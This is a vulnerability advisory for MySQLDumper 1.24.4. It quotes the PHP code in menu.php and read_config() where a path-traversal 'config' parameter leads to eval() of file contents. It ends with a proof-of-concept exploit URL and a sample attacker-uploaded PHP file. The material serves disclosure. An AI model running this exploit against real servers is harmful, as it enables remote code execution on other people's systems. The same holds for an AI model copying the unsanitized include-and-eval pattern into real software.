source: http://www.securityfocus.com/bid/53310/info

MySQLDumper is prone to a vulnerability that lets remote attackers execute arbitrary code because the application fails to sanitize user-supplied input.

Attackers can exploit this issue to execute arbitrary PHP code within the context of the affected webserver process.

MySQLDumper 1.24.4 is vulnerable; other versions may also be affected. 

Vulnerable code section:
/*
//menu.php
if (isset($_POST['selected_config'])||isset($_GET['config']))
{
if (isset($_POST['selected_config'])) $new_config=$_POST['selected_config'];
// Configuration was switched in content frame?
if (isset($_GET['config'])) $new_config=$_GET['config'];
// restore the last active menuitem
if (is_readable($config['paths']['config'].$new_config.'.php'))
{
clearstatcache();
unset($databases);
$databases=array();
if (read_config($new_config))
{
$config['config_file']=$new_config;
$_SESSION['config_file']=$new_config; //$config['config_file'];
$config_refresh='
<script language="JavaScript" type="text/javascript">
if (parent.MySQL_Dumper_content.location.href.indexOf("config_overview.php")!=-1)
{
var selected_div=parent.MySQL_Dumper_content.document.getElementById("sel").value;
}
else selected_div=\'\';
parent.MySQL_Dumper_content.location.href=\'config_overview.php?config='.urlencode($new_config).'&sel=\'+selected_div</script>';
}
if (isset($_GET['config'])) $config_refresh=''; //Neu-Aufruf bei Uebergabe aus Content-Bereich verhindern
}
}



*/
As you can see we can traverse it +

if we will look to read_config() function
//inc/functions_global.php

function read_config($file=false)
{
global $config,$databases;
$ret=false;
if (!$file) $file=$config['config_file'];
// protect from including external files
$search=array(':', 'http', 'ftp', ' ');
$replace=array('', '', '', '');
$file=str_replace($search,$replace,$file);

if (is_readable($config['paths']['config'].$file.'.php'))
{
// to prevent modern server from caching the new configuration we need to evaluate it this way
clearstatcache();
$f=implode('',file($config['paths']['config'].$file.'.php'));
$f=str_replace('<?php','',$f);
$f=str_replace('?>','',$f);
eval($f);
$config['config_file']=$file;
$_SESSION['config_file']=$config['config_file'];
$ret=true;
}
return $ret;
}

this means remote attacker can iterate his/her code as PHP.(Notice: eval($f))

Our exploit:
http://www.example.com/learn/cubemail/menu.php?config=../../ss
where ss = ss.php
#cat ss.php # in eg attacker uploaded his/her own file:
echo 'Our command executed ' . getcwd();
phpinfo();



